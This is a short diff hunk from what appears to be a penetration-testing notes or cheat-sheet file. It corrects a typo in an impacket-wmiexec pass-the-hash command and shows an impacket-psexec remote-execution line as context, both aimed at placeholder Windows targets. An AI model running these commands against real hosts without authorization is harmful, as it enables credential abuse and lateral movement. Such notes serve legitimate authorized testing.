@@ -200,7 +200,7 @@ impacket-psexec $USER:$PASSWORD@$TARGET_IP
 ```
 
 ```bash
-impacket-wmiexec -hashes :$NTLM$ Administrator@$TARGET_IP
+impacket-wmiexec -hashes :$NTLM Administrator@$TARGET_IP
 ```
 
 ```shell
